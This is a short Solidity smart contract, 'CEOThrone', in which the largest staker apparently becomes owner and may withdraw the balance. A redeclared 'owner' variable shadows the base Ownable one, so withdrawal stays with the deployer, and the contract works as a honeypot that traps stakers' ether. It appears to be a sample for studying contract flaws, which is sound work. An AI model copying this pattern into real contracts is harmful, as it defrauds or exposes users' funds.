 

pragma solidity ^0.4.19;
 
 
 
contract Ownable {
    address public owner;
    function Ownable() public {owner = msg.sender;}
    modifier onlyOwner() {require(msg.sender == owner); _;
    }
}
 
 

contract CEOThrone is Ownable {
    address public owner;
    uint public largestStake;
 
 
    function Stake() public payable {
         
        if (msg.value > largestStake) {
            owner = msg.sender;
            largestStake = msg.value;
        }
    }
 
    function withdraw() public onlyOwner {
         
        msg.sender.transfer(this.balance);
    }
}